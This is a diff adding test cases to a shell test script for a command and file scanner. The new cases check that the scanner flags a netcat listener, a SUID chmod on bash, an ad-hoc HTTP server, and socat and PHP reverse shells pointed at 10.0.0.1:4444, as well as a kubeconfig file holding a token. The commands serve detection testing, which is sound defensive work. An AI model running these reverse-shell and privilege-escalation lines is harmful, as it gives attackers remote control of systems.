@@ -9651,6 +9651,42 @@ rm -rf "$XDIR"
     && check "secret: short EAA no flag" "0" "1" \
     || check "secret: short EAA no flag" "0" "0"
 
+# ── cycle-70: paste listener/privesc + kubeconfig exec carrier ──
+./hlse_core paste 'nc -l -p 4444' 2>&1 | grep -q "P13" \
+    && check "paste: nc -l listener flagged" "0" "0" \
+    || check "paste: nc -l listener flagged" "0" "1"
+./hlse_core paste 'chmod +s /bin/bash' 2>&1 | grep -q "P13" \
+    && check "paste: chmod SUID flagged" "0" "0" \
+    || check "paste: chmod SUID flagged" "0" "1"
+./hlse_core paste 'python -m http.server 8000' 2>&1 | grep -q "P13" \
+    && check "paste: ad-hoc http server flagged" "0" "0" \
+    || check "paste: ad-hoc http server flagged" "0" "1"
+./hlse_core paste 'socat exec:"bash -li",pty tcp:10.0.0.1:4444' 2>&1 \
+    | grep -q "Reverse shell" \
+    && check "paste: socat lowercase exec flagged" "0" "0" \
+    || check "paste: socat lowercase exec flagged" "0" "1"
+./hlse_core paste 'php -r "$s=fsockopen(\"10.0.0.1\",4444);exec();"' 2>&1 \
+    | grep -q "Reverse shell" \
+    && check "paste: php fsockopen revshell flagged" "0" "0" \
+    || check "paste: php fsockopen revshell flagged" "0" "1"
+./hlse_core paste 'ls -la /tmp' 2>&1 | grep -q "P13" \
+    && check "paste: ls no listener flag" "0" "1" \
+    || check "paste: ls no listener flag" "0" "0"
+./hlse_core paste 'nc example.com 80' 2>&1 | grep -q "P13" \
+    && check "paste: plain nc connect no flag" "0" "1" \
+    || check "paste: plain nc connect no flag" "0" "0"
+XDIR70=$(mktemp -d "${TMPDIR:-/tmp}/hlse70.XXXXXX")
+printf 'clusters:\n- cluster:\n    server: https://e\nusers:\n- name: u\n  user:\n    token: abc\n' \
+    > "$XDIR70/kubeconfig"
+./hlse_core file "$XDIR70/kubeconfig" 2>&1 | grep -q "45\|ALERT" \
+    && check "file: kubeconfig creds flagged" "0" "0" \
+    || check "file: kubeconfig creds flagged" "0" "1"
+printf 'clusters:\n- {}\nusers:\n- {}\n' > "$XDIR70/empty.kubeconfig"
+./hlse_core file "$XDIR70/empty.kubeconfig" 2>&1 | grep -q "ALERT\|BLOCK\|ISOLATE" \
+    && check "file: empty kubeconfig no flag" "0" "1" \
+    || check "file: empty kubeconfig no flag" "0" "0"
+rm -rf "$XDIR70"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
